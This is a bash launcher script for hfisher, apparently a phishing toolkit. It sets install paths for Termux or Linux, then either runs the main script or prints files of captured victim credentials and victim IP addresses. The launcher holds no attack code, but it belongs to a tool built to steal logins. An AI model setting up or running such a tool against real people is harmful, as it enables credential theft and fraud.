#!/bin/bash

# https://github.com/hsecurities/hfisher

if [[ $(uname -o) == *'Android'* ]];then
	hfisher_ROOT="/data/data/com.termux/files/usr/opt/hfisher"
else
	export hfisher_ROOT="/opt/hfisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run hfisher type \`hfisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $hfisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $hfisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $hfisher_ROOT
	bash ./hfisher.sh
fi
